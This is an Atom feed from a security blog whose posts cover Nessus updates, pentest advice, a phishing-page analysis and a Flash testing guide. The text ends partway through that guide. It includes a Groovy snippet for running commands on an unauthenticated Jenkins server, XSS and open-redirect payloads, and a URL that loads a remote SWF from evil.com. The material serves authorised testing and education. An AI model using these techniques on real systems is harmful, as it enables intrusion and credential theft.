<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en">
<title type="text">BoringSec</title>
<generator uri="https://github.com/mojombo/jekyll">Jekyll</generator>
<link rel="self" type="application/atom+xml" href="/feed.xml" />
<link rel="alternate" type="text/html" href="" />
<updated>2015-02-21T04:18:39-08:00</updated>
<id>/</id>
<author>
  <name></name>
  <uri>/</uri>
  <email></email>
</author>


<entry>
  <title type="html"><![CDATA[Updating Tenable Nessus Plugins]]></title>
  <link>/2015/03/updating-nessus-plugins</link>
  <id>/2015/03/updating-nessus-plugins</id>
  <published>2015-03-02T00:00:00-08:00</published>
  <updated>2015-03-02T00:00:00-08:00</updated>
  <author>
    <name></name>
    <uri></uri>
    <email></email>
  </author>
  <content type="html">&lt;p&gt;&lt;em&gt;Since I always keep forgetting how to manually update the plugins for &lt;a href=&quot;http://www.tenable.com/products/nessus-vulnerability-scanner&quot;&gt;Tenable Nessus&lt;/a&gt;, I&amp;#39;m posting this here so I can easily find it later.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;To perform a manual update of the plugin feed it&amp;#39;s necessary to execute the following command. Note that Nessus will also warn the user when the feed download has been completed.&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;sudo /opt/nessus/sbin/nessus-update-plugins
Fetching the newest updates from nessus.org...
Done. The Nessus server will start processing these plugins within a minute&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;To check whether the plugins have been correctly updated or not, it&amp;#39;s possible to check the feed version by simply reading a specific file, as shown below.&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;cat /opt/nessus/lib/nessus/plugins/plugin_feed_info.inc
&lt;span class=&quot;nv&quot;&gt;PLUGIN_SET&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;201502240415&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;PLUGIN_FEED&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;ProfessionalFeed (Direct)&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;After the update command has been successfully executed, Nessus will begin initialising. This may take some time depending on how old the plugin feed was.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/2015-03-02-updating-nessus-plugins/nessus-initialising.png&quot; alt=&quot;Nessus Initialisation&quot;&gt;&lt;/p&gt;

  &lt;p&gt;&lt;a href=&quot;/2015/03/updating-nessus-plugins&quot;&gt;Updating Tenable Nessus Plugins&lt;/a&gt; was originally published by  at &lt;a href=&quot;&quot;&gt;BoringSec&lt;/a&gt; on March 02, 2015.&lt;/p&gt;</content>
</entry>


<entry>
  <title type="html"><![CDATA[Exploiting Jenkins Console Script]]></title>
  <link>/2015/02/jenkins-console-script</link>
  <id>/2015/02/jenkins-console-script</id>
  <published>2015-02-27T00:00:00-08:00</published>
  <updated>2015-02-27T00:00:00-08:00</updated>
  <author>
    <name></name>
    <uri></uri>
    <email></email>
  </author>
  <content type="html">&lt;p&gt;During a recent Penetration Test, I found an unauthenticated instance of &lt;a href=&quot;http://jenkins-ci.org/&quot;&gt;Jenkins&lt;/a&gt;, an open source continuous integration (CI) tool.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/2015-02-28-jenkins-console-script/Jenkins-No-Auth.png&quot; alt=&quot;Unauthenticated Jenkins Web Application&quot;&gt;&lt;/p&gt;

&lt;p&gt;While browsing the web application for interesting information, the &lt;em&gt;Jenkins Console Script&lt;/em&gt; (&amp;#39;http://jenkins/script&amp;#39;) got my attention. This feature allows users to execute arbitrary &lt;a href=&quot;http://groovy.codehaus.org/&quot;&gt;Groovy&lt;/a&gt; scripts directly on the server and, with a little help from Stack Overflow, I quickly pulled together the following code to execute any command.&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-groovy&quot; data-lang=&quot;groovy&quot;&gt;&lt;span class=&quot;kt&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;command&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;&amp;quot;&amp;quot;whoami&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;execute&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;waitFor&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;println&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;return code: ${ proc.exitValue()}&amp;quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;println&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;stderr: ${proc.err.text}&amp;quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;println&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;stdout: ${proc.in.text}&amp;quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Using the script to browse the server&amp;#39;s file system, a file that included authentication credentials for an additional corporate application was identified. Access to this service allowed the disclosure of the whole source code of the customer&amp;#39;s applications.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/2015-02-28-jenkins-console-script/Jenkins-Read-Credentials.png&quot; alt=&quot;Reading Credentials via Console Script&quot;&gt;&lt;/p&gt;

&lt;p&gt;The default configuration of Jenkins does not perform any security check and does not enforce user authentication, allowing anyone to access the web application, configure Jenkins and its jobs, perform builds, etc.&lt;/p&gt;

&lt;p&gt;As stated in the &lt;a href=&quot;https://wiki.jenkins-ci.org/display/JENKINS/Jenkins+Best+Practices&quot;&gt;Jenkins Best Practice&lt;/a&gt;, it is very important to &lt;em&gt;always secure Jenkins&lt;/em&gt;, even when it is implemented for intranet use only (as demonstrated during this Penetration Test). If interested, take a look at the official &lt;a href=&quot;https://wiki.jenkins-ci.org/display/JENKINS/Securing+Jenkins&quot;&gt;Securing Jenkins&lt;/a&gt; article.&lt;/p&gt;

  &lt;p&gt;&lt;a href=&quot;/2015/02/jenkins-console-script&quot;&gt;Exploiting Jenkins Console Script&lt;/a&gt; was originally published by  at &lt;a href=&quot;&quot;&gt;BoringSec&lt;/a&gt; on February 27, 2015.&lt;/p&gt;</content>
</entry>


<entry>
  <title type="html"><![CDATA[Corporate Penetration Testing with BeEF]]></title>
  <link>/2013/10/corporate-penetration-testing-with-beef</link>
  <id>/2013/10/corporate-penetration-testing-with-beef</id>
  <published>2013-10-29T00:00:00-07:00</published>
  <updated>2013-10-29T00:00:00-07:00</updated>
  <author>
    <name></name>
    <uri></uri>
    <email></email>
  </author>
  <content type="html">&lt;h4&gt;Presented on October 25 2013 at &lt;a href=&quot;http://www.smau.it/milano13/schedules/uso-di-beef-nel-penetration-testing-aziendale/&quot;&gt;SMAU Milano&lt;/a&gt;.&lt;/h4&gt;

&lt;p&gt;This talk (in Italian) introduced &lt;a href=&quot;http://beefproject.com&quot;&gt;The Browser Exploitation Framework&lt;/a&gt; (BeEF) and some of its most interesting modules. Focused on &lt;em&gt;social engineering&lt;/em&gt;, the presentation demonstrated the effectiveness of BeEF during a penetration test.&lt;/p&gt;

&lt;p&gt;Get the slides on &lt;a href=&quot;https://speakerdeck.com/gcattani/penetration-testing-aziendale-con-beef&quot;&gt;Speaker Deck&lt;/a&gt; or watch them below.&lt;/p&gt;

&lt;h3&gt;Slides&lt;/h3&gt;

&lt;script async class=&quot;speakerdeck-embed&quot; data-id=&quot;d13373e021160131fca9464dee30730c&quot; data-ratio=&quot;1.33333333333333&quot; src=&quot;//speakerdeck.com/assets/embed.js&quot;&gt;&lt;/script&gt;

  &lt;p&gt;&lt;a href=&quot;/2013/10/corporate-penetration-testing-with-beef&quot;&gt;Corporate Penetration Testing with BeEF&lt;/a&gt; was originally published by  at &lt;a href=&quot;&quot;&gt;BoringSec&lt;/a&gt; on October 29, 2013.&lt;/p&gt;</content>
</entry>


<entry>
  <title type="html"><![CDATA[A Quick Analysis of a Visa-MasterCard Phishing Page]]></title>
  <link>/2013/07/visa-mastercard-phishing</link>
  <id>/2013/07/visa-mastercard-phishing</id>
  <published>2013-07-16T00:00:00-07:00</published>
  <updated>2013-07-16T00:00:00-07:00</updated>
  <author>
    <name></name>
    <uri></uri>
    <email></email>
  </author>
  <content type="html">&lt;p&gt;A phishing e-mail claiming it was from Visa got through Gmail&amp;#39;s filters, making its way to my inbox. I&amp;#39;ve seen similar messages in the last months and decided to analyze the malicious web site.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/2013-07-16-visa-mastercard-phishing/01-email.png&quot; alt=&quot;Phishing Email&quot;&gt;&lt;/p&gt;

&lt;p&gt;First of all, the message conveys a sense of urgency, both in its content and in its object (&amp;quot;&lt;em&gt;Your Credit Card has been Suspended . Please Update It !&lt;/em&gt;&amp;quot;). This is a well-known tactic used to make sure that users won&amp;#39;t pass by the e-mail without giving it much thought.&lt;/p&gt;

&lt;p&gt;What I did find unusual, is that the phishing address is not hidden in any way. While the URL could easily fool an unexperienced user, it is pretty clear that the compromised domain is &lt;code&gt;holistica2000.com.ar&lt;/code&gt; (&amp;quot;&lt;em&gt;El Portal holístico del Tercer Milenio&lt;/em&gt;&amp;quot;).&lt;/p&gt;

&lt;p&gt;As a side note, during my first visits Firefox wasn&amp;#39;t warning me about the malicious nature of the website, but got onto it in less than 8 hours from the original e-mail.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/2013-07-16-visa-mastercard-phishing/02-site.png&quot; alt=&quot;Phishing Page&quot;&gt;&lt;/p&gt;

&lt;p&gt;At a first sight, the phishing page looks extremely polished and professional, sporting a good English level. However, a quick analysis of the source code showed that the page looks so real because it&amp;#39;s a direct copy a &lt;a href=&quot;www.mastercard.ca/education/credit-rating.html&quot;&gt;MasterCard&amp;#39;s one&lt;/a&gt;. The source code includes the following comment:&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;c&quot;&gt;&amp;lt;!-- Mirrored from www.mastercard.ca/education/credit-rating.html by HTTrack Website Copier/3.x [XR&amp;amp;CO&amp;#39;2010], Sat, 13 Oct 2012 12:45:21 GMT --&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The fraudster didn&amp;#39;t even bother to clean the code for obvious clues like this, which still won&amp;#39;t be noticed by the typical phishing victim. The source code analysis didn&amp;#39;t reveal any malicious script, confirming that the web site has been created for the sole purpose of phishing users.&lt;/p&gt;

&lt;p&gt;It&amp;#39;s worth noting that all the links on the page do not work, effectively keeping the user inside the phishing environment. Furthermore, Visa&amp;#39;s logo has been added to the original MasterCard&amp;#39;s one, in order to extend the victim&amp;#39;s pool (while the phishing e-mail only mentioned Visa).&lt;/p&gt;

&lt;p&gt;The central element of the page is a very long form, which asks for many personal information about the victim, as well as information regarding the credit card.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/2013-07-16-visa-mastercard-phishing/03-module.png&quot; alt=&quot;Phishing Module&quot;&gt;&lt;/p&gt;

&lt;p&gt;When the form data gets sent to &lt;code&gt;/validation.php&lt;/code&gt;, the victim is then redirected to &lt;code&gt;/verifiedbyvisa.html&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;This second phishing page asks for more information, including the victim&amp;#39;s Social Security Number, the ATM code, the &lt;em&gt;3D&lt;/em&gt; and &lt;em&gt;Verified by Visa&lt;/em&gt; passwords. It&amp;#39;s worth noting that the form will ask for a &lt;em&gt;Verified by Visa&lt;/em&gt; code even if the victim previously selected a different card type.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/2013-07-16-visa-mastercard-phishing/04-pins.png&quot; alt=&quot;Phishing PINs&quot;&gt;&lt;/p&gt;

&lt;p&gt;The greedy fraudster doesn&amp;#39;t stop here! After sending the additional information to &lt;code&gt;/validation2.php&lt;/code&gt;, the victim is redirected one more time, this time to &lt;code&gt;/bank-inf.html&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;This last phishing page asks for authentication information regarding online services. The targeted ones are PayPal, Moneybookers, Liberty Reserve, Payza, Alertpay.&lt;/p&gt;

&lt;p&gt;An interesting addition is the possibility to skip this step if the victim doesn&amp;#39;t use any of the listed services, increasing the realism of the whole page.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/2013-07-16-visa-mastercard-phishing/05-online.png&quot; alt=&quot;Phishing Online Services&quot;&gt;&lt;/p&gt;

&lt;p&gt;When all the requested information is sent (this time to &lt;code&gt;/validation-bank.php&lt;/code&gt;), the user is even greeted with a message congratulating him/her on the newly acquired security!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/2013-07-16-visa-mastercard-phishing/06-congratulations.png&quot; alt=&quot;Final Congratulations&quot;&gt;&lt;/p&gt;

  &lt;p&gt;&lt;a href=&quot;/2013/07/visa-mastercard-phishing&quot;&gt;A Quick Analysis of a Visa-MasterCard Phishing Page&lt;/a&gt; was originally published by  at &lt;a href=&quot;&quot;&gt;BoringSec&lt;/a&gt; on July 16, 2013.&lt;/p&gt;</content>
</entry>


<entry>
  <title type="html"><![CDATA[Don't Make Penetration Testing a Waste of Time]]></title>
  <link>/2013/04/dont-make-penetration-testing-a-waste-of-time</link>
  <id>/2013/04/dont-make-penetration-testing-a-waste-of-time</id>
  <published>2013-04-17T00:00:00-07:00</published>
  <updated>2013-04-17T00:00:00-07:00</updated>
  <author>
    <name></name>
    <uri></uri>
    <email></email>
  </author>
  <content type="html">&lt;p&gt;Recently I read an interesting article by Jim Bird titled &lt;a href=&quot;http://swreflections.blogspot.it/2013/04/penetration-testing-shouldnt-be-waste.html&quot;&gt;&lt;em&gt;&amp;quot;Penetration Testing Shouldn&amp;#39;t be a Waste of Time&amp;quot;&lt;/em&gt;&lt;/a&gt;, which was written following another post by Rohit Sethi, &lt;a href=&quot;http://blog.sdelements.com/is-penetration-testing-a-waste-of-time/&quot;&gt;&lt;em&gt;&amp;quot;Debunking Myths: Penetration Testing is a Waste of Time&amp;quot;&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Since both articles focus only on the client&amp;#39;s side of an assessment, a critical part has not been taken into account: &lt;strong&gt;the tester&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;--&lt;/p&gt;

&lt;p&gt;The role of a proper penetration tester goes beyond the mere &lt;em&gt;pwnage&lt;/em&gt; of the target system, as an assessment should provide a client with the clear understanding of the system&amp;#39;s vulnerabilities and of the data at risk.&lt;/p&gt;

&lt;p&gt;It all starts during the kick-off meeting(s), before the actual hands-on testing. This is the place where a tester must clearly understand what the client is asking (not always trivial) and which targets are the most critical in order to make the most out of the limited testing time available.&lt;/p&gt;

&lt;p&gt;When dealing with systems in a production environment (and it happens more frequently than I&amp;#39;d like to admit!), define beforehand if, how and when critical vulnerabilities should be disclosed to the client, even meanwhile the test is still ongoing.&lt;/p&gt;

&lt;p&gt;During the testing activities, ask for the client&amp;#39;s assistance when needed: don&amp;#39;t lose a whole day when a 5 minute call would have answered your doubts. If you struggle to understand how a process works, just ask. If you need your IP address to be whitelisted on the firewall in order to test properly, just ask (unless this is the scope of the assessment).&lt;/p&gt;

&lt;p&gt;In the final report, be as clear as possible about the vulnerabilities found and the performed attacks, focusing on their root causes and their impact on the target application. Even simple screenshots should be clear and descriptions should get right to the point, without confusing the reader with unnecessary technical jargon or convoluted explanations.&lt;/p&gt;

&lt;p&gt;In order to provide developers with enough information to properly solve any issue, make sure to include proofs of concept that can be easily replicated by following simple steps. Feel free to include more technical examples if needed, but only after the basic one.&lt;/p&gt;

&lt;p&gt;Provide a realistic picture of the target&amp;#39;s exposure, focusing on the most critical issues and without exaggerating low impact vulnerabilities. Your expertise is paramount for a client who will need to define an action plan in order to solve the system&amp;#39;s problems.&lt;/p&gt;

&lt;p&gt;When presenting the results of the test to the client, you must keep in mind who are the people listening and adapt accordingly. Most of the times, the people involved on the client&amp;#39;s side are not tech-savy, at least not as much as a tester would like.&lt;/p&gt;

&lt;p&gt;Be ready to explain anything included in the report and consider carefully the knowledge of the people you are talking to. You may have to explain, for example, Cross-Site Scripting (or worse, Cross-Site Request Forgery) to people who have no idea how browsers, HTML or HTTP work.&lt;/p&gt;

&lt;p&gt;If the client has you meet the developers that would be fixing the security issues, provide suggestions that will help solving the issue permanently, instead of directing them to solutions that work only for a specific situation.&lt;/p&gt;

&lt;p&gt;In the end, a successful penetration test is defined by both the client&amp;#39;s and the tester&amp;#39;s behaviour and mindset, but the tester plays a key role in all the parts of the project. As the one who knows how the whole project works, the tester should assist the client whenever needed, providing enough information to make him/her understand the value of such assessments.&lt;/p&gt;

  &lt;p&gt;&lt;a href=&quot;/2013/04/dont-make-penetration-testing-a-waste-of-time&quot;&gt;Don't Make Penetration Testing a Waste of Time&lt;/a&gt; was originally published by  at &lt;a href=&quot;&quot;&gt;BoringSec&lt;/a&gt; on April 17, 2013.&lt;/p&gt;</content>
</entry>


<entry>
  <title type="html"><![CDATA[Introducing ListInt]]></title>
  <link>/2013/04/listint</link>
  <id>/2013/04/listint</id>
  <published>2013-04-03T00:00:00-07:00</published>
  <updated>2013-04-03T00:00:00-07:00</updated>
  <author>
    <name></name>
    <uri></uri>
    <email></email>
  </author>
  <content type="html">&lt;p&gt;Ever felt the need to quickly and painlessly generate a long list of numbers? &lt;strong&gt;ListInt&lt;/strong&gt; can help!&lt;/p&gt;

&lt;p&gt;--&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;ListInt&lt;/strong&gt; is a simple Perl script that does only one thing: generating user-defined lists of integers. It can be executed like this:&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;perl listint.pl {FROM} {TO} [OPTIONS]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;em&gt;FROM&lt;/em&gt; is the first integer of the list and &lt;em&gt;TO&lt;/em&gt; is the last one. ListInt is smart enough to understand that if a users provides a starting value higher than the ending one, the expected result is a descending list (e.g. from 100 to 0).&lt;/p&gt;

&lt;p&gt;To further extend its features, ListInt is able to print only even (&lt;code&gt;-e&lt;/code&gt;) or odd (&lt;code&gt;-o&lt;/code&gt;) numbers between the values provided as arguments. Finally, ListInt can add arbitrary strings as prefix (&lt;code&gt;-p&lt;/code&gt;) or suffix (&lt;code&gt;-s&lt;/code&gt;) for all the numbers listed as its output.&lt;/p&gt;

&lt;p&gt;Take a look at a couple of simple examples and &lt;a href=&quot;https://github.com/gcattani/listint&quot;&gt;give it a try&lt;/a&gt;!&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;$ perl listint.pl 10 0 -o -p id_
id_9
id_7
id_5
id_3
id_1

$ perl listint.pl 10 0 -e -s 000
10000
8000
6000
4000
2000
0000
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;--&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Get ListInt on &lt;a href=&quot;https://github.com/gcattani/listint&quot;&gt;GitHub&lt;/a&gt;!&lt;/strong&gt;&lt;br&gt;
Know how to make ListInt better? Get in touch or fork the repository!&lt;/p&gt;

  &lt;p&gt;&lt;a href=&quot;/2013/04/listint&quot;&gt;Introducing ListInt&lt;/a&gt; was originally published by  at &lt;a href=&quot;&quot;&gt;BoringSec&lt;/a&gt; on April 03, 2013.&lt;/p&gt;</content>
</entry>


<entry>
  <title type="html"><![CDATA[Flash Testing for Dummies]]></title>
  <link>/2013/03/flash-testing-for-dummies</link>
  <id>/2013/03/flash-testing-for-dummies</id>
  <published>2013-03-31T00:00:00-07:00</published>
  <updated>2013-03-31T00:00:00-07:00</updated>
  <author>
    <name></name>
    <uri></uri>
    <email></email>
  </author>
  <content type="html">&lt;p&gt;&lt;em&gt;or: A Fast Flash Testing Guide for the Busy Pentester&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;--&lt;/p&gt;

&lt;p&gt;The aim of this &amp;quot;guide&amp;quot; is to provide an up-to-date and easy way to test SWF files, without the assle of learning ActionScript or wasting excessive time, while still getting the relevant low hanging fruits.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Note - All the techniques presented in this article have been tested and confirmed working in Chrome 23 with Flash 11.5, running on OS X 10.7.5.&lt;/em&gt;&lt;/p&gt;

&lt;h3&gt;# Tools of the Trade&lt;/h3&gt;

&lt;p&gt;The most useful tool is probably &lt;a href=&quot;http://h30499.www3.hp.com/t5/Following-the-Wh1t3-Rabbit/SWFScan-FREE-Flash-decompiler/ba-p/5440167&quot;&gt;HP SWFScan&lt;/a&gt;, which provides a decompiler and an automatic vulnerability scanner. While the software is prone to false negatives, it&amp;#39;s still the best tool when you need to analyze ActionScript code in a limited time.&lt;/p&gt;

&lt;p&gt;If a Windows operating system is not an option or you&amp;#39;d rather dive directly into the code without a fancy GUI, &lt;a href=&quot;http://www.nowrap.de/flare.html&quot;&gt;flare&lt;/a&gt; is what you are looking for. Flare is a simple command-line decompiler, very reliable, but its development came to a halt in 2005.&lt;/p&gt;

&lt;p&gt;Other tools that might be useful are &lt;a href=&quot;http://labs.adobe.com/downloads/swfinvestigator.html&quot;&gt;Adobe SWF Investigator&lt;/a&gt;, which provides a disassembler and other utilities, and &lt;a href=&quot;http://www.swftools.org/&quot;&gt;SWFTools&lt;/a&gt;, a collection of several software that, sadly, lacks a decompiler. &lt;/p&gt;

&lt;h3&gt;1- Search Engine Discovery&lt;/h3&gt;

&lt;p&gt;In order to find all (most?) the SWF files on your target domain you just need a simple Google dork: &lt;code&gt;filetype:swf site:TARGET&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;If the amount of files returned by the previous generic search is too much, try reducing it with &lt;code&gt;inurl:login&lt;/code&gt;, &lt;code&gt;inurl:admin&lt;/code&gt;, &lt;code&gt;inurl:secure&lt;/code&gt; or similar.&lt;/p&gt;

&lt;h3&gt;2- Information Disclosure&lt;/h3&gt;

&lt;p&gt;There is literally anything you could find hard-coded inside SWF files: from remote gateways to authentication credentials, from IP addresses to remote resources.&lt;/p&gt;

&lt;p&gt;In order to identify all the interesting information inside of a SWF file, you need to decompile (or disassemble) it and review the code manually. Note that while SWFScan sometimes identifies critical data, it just isn&amp;#39;t reliable enough to trust exclusively its automatic results.&lt;/p&gt;

&lt;h3&gt;3- Reflected Cross-Site Scripting&lt;/h3&gt;

&lt;p&gt;The main cause for XSS in Flash files is the use of &lt;strong&gt;uninitialized variables&lt;/strong&gt;, which, if not initialized to a value, can be arbitrarily assigned by users. Furthermore, global variables (_root.*, _global.*, _level0.*) and unsafe methods (e.g. getURL, loadVars.*, XML.load, htmlText, loadVariables, loadMovie, loadMovieNum) need to be taken into account when looking for vulnerable code in Flash files. A sample payload that can be used to test for XSS is &lt;code&gt;javascript:alert(&amp;#39;XSS&amp;#39;)&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;button 16 {
    on (release) {
        getURL(clickTAG, &amp;#39;_self&amp;#39;);
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The &lt;em&gt;clickTAG&lt;/em&gt; variable in the previous decompiled code is not initialized and will accept any value. Hence, the XSS could be triggered trivially: &lt;code&gt;http://example.com/home.swf?clickTAG=javascript:alert(&amp;#39;XSS&amp;#39;)&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;The following are all examples of code vulnerable to XSS.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;var __callResult_1 = getURL(_root.clickTag, &amp;quot;_blank&amp;quot;);
var __callResult_2 = getURL(clickTag, &amp;quot;_blank&amp;quot;);
var __callResult_3 = getURL(clickTag, &amp;quot;&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;On the other hand, &lt;code&gt;var __callResult_4 = getURL(&amp;quot;http://example.com&amp;quot;, &amp;quot;_blank&amp;quot;);&lt;/code&gt; is not vulnerable.&lt;/p&gt;

&lt;h3&gt;4- Open Redirect&lt;/h3&gt;

&lt;p&gt;Uninitialized variables also cause SWFs to be vulnerable to Open Redirects, allowing an attacker to forge a URL that will redirect users to an arbitrary domain.&lt;/p&gt;

&lt;p&gt;If you find uninitialized variables in the code or a file that accepts a remote file as parameter (e.g. &lt;code&gt;http://example.com/supertrooper.swf?band=/abba.asp&lt;/code&gt;), it is probably an open redirector and should be tested accordingly.&lt;/p&gt;

&lt;h5&gt;Recap: How to Test for XSS and Open Redirects&lt;/h5&gt;

&lt;ol&gt;
&lt;li&gt;Get the SWF file&lt;/li&gt;
&lt;li&gt;Decompile it&lt;/li&gt;
&lt;li&gt;Scan the code with SWFScan&lt;/li&gt;
&lt;li&gt;Review the code checking for variables&lt;/li&gt;
&lt;li&gt;Test the variables that seem vulnerable (do not trust SWFScan)&lt;/li&gt;
&lt;/ol&gt;

&lt;h3&gt;5- Cross-Site Flashing&lt;/h3&gt;

&lt;p&gt;Cross-Site Flashing (XSF) occurs when an SWF file is able to load another file from a different domain. The vulnerable SWF can be exploited to load a malicious Flash file that can be used to perform several kinds of attacks, such as Cross-Site Scripting or Phishing via a fake interface. Let&amp;#39;s take a look at some code:&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;internal function frame1(){
    this.url = &amp;quot;&amp;quot;;
    this.movieurl = &amp;quot;&amp;quot;;
    this.paramObj =
    LoaderInfo(this.root.loaderInfo).parameters;
    this.movieurl = String(this.paramObj[&amp;quot;movieurl&amp;quot;]);
    if(this.movieurl != &amp;quot;&amp;quot;) {
        this.LoadMovie(this.movieurl);
    } else {
        this.LoadMovie(&amp;quot;defaulf.swf&amp;quot;);
    }
    [...] 
    {% highlight actionscript %}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;As can be seen in the previous code, the &lt;em&gt;movieurl&lt;/em&gt; variable is not initialized and the &lt;em&gt;LoadMovie&lt;/em&gt; function accepts any value, even from external domains. So, the vulnerable SWF will load any file: &lt;code&gt;http://example.com/movie.swf?movieurl=http://evil.com/xss.swf&lt;/code&gt;&lt;/p&gt;

&lt;h3&gt;6- Crossdomain Policy&lt;/h3&gt;

&lt;p&gt;A SWF file is not allowed to access data that resides outside of its web domain and a sub-domain is not able to read data from a parent domain (and vice-versa). The Flash Player uses cross-domain policy files to give permission to access data from a given domain.&lt;/p&gt;

&lt;p&gt;Testing for a vulnerable cross-domain policy is trivial: take a look at the &lt;code&gt;/crossdomain.xml&lt;/code&gt; file, always found in the website root. If it looks like the following code...&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;&amp;lt;cross-domain-policy&amp;gt;
    &amp;lt;allow-access-from domain=&amp;quot;*&amp;quot;/&amp;gt;
&amp;lt;/cross-domain-policy&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;...then the website accepts requests from Flash files from &lt;strong&gt;all&lt;/strong&gt; domains and will return the full response.&lt;/p&gt;

&lt;h3&gt;# References&lt;/h3&gt;

&lt;p&gt;Following are the articles and documents used to get most of the information presented in this post, listed chronologically.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;2006 - &lt;a href=&quot;http://shiflett.org/blog/2006/sep/the-dangers-of-cross-domain-ajax-with-flash&quot;&gt;The Dangers of Cross-Domain Ajax with Flash&lt;/a&gt; (by Chris Shiflett)&lt;/li&gt;
&lt;li&gt;2006 - &lt;a href=&quot;http://shiflett.org/blog/2006/oct/the-crossdomain.xml-witch-hunt&quot;&gt;The crossdomain.xml Witch Hunt&lt;/a&gt; (by Chris Shiflett)&lt;/li&gt;
&lt;li&gt;2008 - &lt;a href=&quot;http://jeremiahgrossman.blogspot.it/2008/05/crossdomainxml-invites-cross-site.html&quot;&gt;Crossdomain.xml Invites Cross-site Mayhem&lt;/a&gt; (by Jeremiah Grossman)&lt;/li&gt;
